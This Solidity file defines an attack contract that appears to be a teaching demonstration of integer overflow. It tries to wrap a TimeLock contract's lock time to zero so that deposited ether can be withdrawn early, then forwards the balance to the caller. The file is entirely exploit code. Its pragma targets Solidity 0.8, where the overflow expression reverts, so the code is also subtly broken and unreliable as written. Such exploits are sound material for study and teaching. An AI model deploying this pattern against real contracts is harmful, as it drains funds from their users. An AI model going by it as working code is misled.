//SPDX-License-Identifier:MIT
pragma solidity ^0.8.2;
interface TimeLock{
    function deposit()external payable;
    function increaseLockTime(uint _seconds)external;
     function withdraw()external;
     function lockTime(address _address) external view returns (uint256);


}

contract Attack{
    TimeLock timelock;
   
    constructor(address _timeLock){
        timelock = TimeLock(_timeLock);
    }

    receive()external payable{

    }

    // fallback() external payable {}

    function attack() public payable {
        timelock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        + 1 - timelock.lockTime(address(this)
        */
        timelock.increaseLockTime(
            type(uint).max + 1 - timelock.lockTime(address(this))
        );
        timelock.withdraw();
    }

    function withdrawAmount()public {
        (bool success,) = msg.sender.call{value:address(this).balance}("");
        require(success,"failed");
    }
    

}
